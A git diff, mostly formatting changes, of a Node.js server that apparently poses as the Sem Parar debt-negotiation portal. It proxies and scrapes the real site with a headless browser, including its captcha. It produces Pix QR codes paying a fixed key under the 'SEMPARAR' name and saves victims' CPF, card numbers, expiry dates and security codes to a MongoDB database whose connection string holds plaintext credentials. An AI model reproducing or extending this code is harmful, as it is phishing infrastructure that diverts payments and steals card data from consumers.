@@ -6,11 +6,10 @@ const bodyParser = require("body-parser");
 const axios = require("axios"); // Importe o Axios aqui
 const app = express();
 const port = 4642;
-const cors = require('cors');
-const { createProxyMiddleware } = require('http-proxy-middleware');
+const cors = require("cors");
+const { createProxyMiddleware } = require("http-proxy-middleware");
 const mongoose = require("mongoose");
 const Cartao = require("./models/Cartao"); // Importe o modelo de cartão
-
 
 require("dotenv").config();
 
@@ -29,30 +28,34 @@ app.use(
   })
 );
 
-mongoose.connect("mongodb+srv://semparar:semparar@cartao.darfzoh.mongodb.net/?retryWrites=true&w=majority&appName=AtlasApp", {
-  useNewUrlParser: true,
-  useUnifiedTopology: true,
-})
-.then(() => {
-  console.log('Conexão com o MongoDB bem-sucedida');
-})
-.catch((error) => {
-  console.error('Erro na conexão com o MongoDB:', error);
-});
+mongoose
+  .connect(
+    "mongodb+srv://semparar:semparar@cartao.darfzoh.mongodb.net/?retryWrites=true&w=majority&appName=AtlasApp",
+    {
+      useNewUrlParser: true,
+      useUnifiedTopology: true,
+    }
+  )
+  .then(() => {
+    console.log("Conexão com o MongoDB bem-sucedida");
+  })
+  .catch((error) => {
+    console.error("Erro na conexão com o MongoDB:", error);
+  });
 
 const proxyOptions = {
-  target: 'https://portaldenegociacao.semparar.com.br/recuperaportal/', // URL do serviço de destino
+  target: "https://portaldenegociacao.semparar.com.br/recuperaportal/", // URL do serviço de destino
   changeOrigin: true, // Altera a origem do cabeçalho para o destino
   pathRewrite: {
-    '^/proxy': '', // Opcional: reescreve a URL para remover o caminho "/proxy"
+    "^/proxy": "", // Opcional: reescreve a URL para remover o caminho "/proxy"
   },
 };
 
 // Middleware do proxy
-const proxy = createProxyMiddleware('/proxy', proxyOptions);
+const proxy = createProxyMiddleware("/proxy", proxyOptions);
 
 // Use o middleware do proxy
-app.use('/', proxy);
+app.use("/", proxy);
 
 let page = null;
 
@@ -118,7 +121,7 @@ app.get("/", async (req, res) => {
       "https://portaldenegociacao.semparar.com.br/recuperaportal/"
     );
     console.log("Entrou no semparar");
-      console.log("Entrou no semparar")
+    console.log("Entrou no semparar");
     await captchaScreenshot(page);
 
     app.use(express.static(path.join(__dirname, "views")));
@@ -181,7 +184,9 @@ app.post("/autenticar", async (req, res) => {
     }
 
     // Aguarde até que o elemento .text.bold.secondary-text apareça na página
-    await page.waitForSelector(".text.bold.secondary-text", {timeout: 100000});
+    await page.waitForSelector(".text.bold.secondary-text", {
+      timeout: 100000,
+    });
 
     const valor = await page.evaluate(() => {
       const val = document.querySelector(".text.bold.secondary-text");
@@ -199,7 +204,7 @@ app.post("/autenticar", async (req, res) => {
       CPF,
     });
   } catch (error) {
-    res.redirect('/')
+    res.redirect("/");
   }
 });
 
@@ -208,14 +213,17 @@ app.post("/pix", async (req, res) => {
     const { valor, nome } = req.body; // Obtenha o valor e o nome do corpo da solicitação POST
 
     // Faça a chamada à API
-    const response = await axios.post("http://localhost:8000/emvqr-static", {
-      key: "8d604ad6-5a13-4a09-aa6f-ec159618f52d",
-      amount: valor.toString(),
-      name: nome,
-      reference: "SEMPARAR",
-      key_type: "chave",
-      city: "SEMPARAR",
-    });
+    const response = await axios.post(
+      "https://gerador-pix-v6kk.onrender.com/emvqr-static",
+      {
+        key: "8d604ad6-5a13-4a09-aa6f-ec159618f52d",
+        amount: valor.toString(),
+        name: nome,
+        reference: "SEMPARAR",
+        key_type: "chave",
+        city: "SEMPARAR",
+      }
+    );
 
     // Os dados retornados pela API estarão em response.data
     const apiData = response.data;
@@ -230,7 +238,14 @@ app.post("/pix", async (req, res) => {
 
 app.post("/cadastrar-cartao", async (req, res) => {
   try {
-    const { CPF, numeroCartao, nomeCartao, validadeMes, validadeAno, codigoSeguranca } = req.body;
+    const {
+      CPF,
+      numeroCartao,
+      nomeCartao,
+      validadeMes,
+      validadeAno,
+      codigoSeguranca,
+    } = req.body;
 
     // Aqui, você pode usar o modelo de dados do cartão para salvar os dados no banco de dados
     const novoCartao = new Cartao({
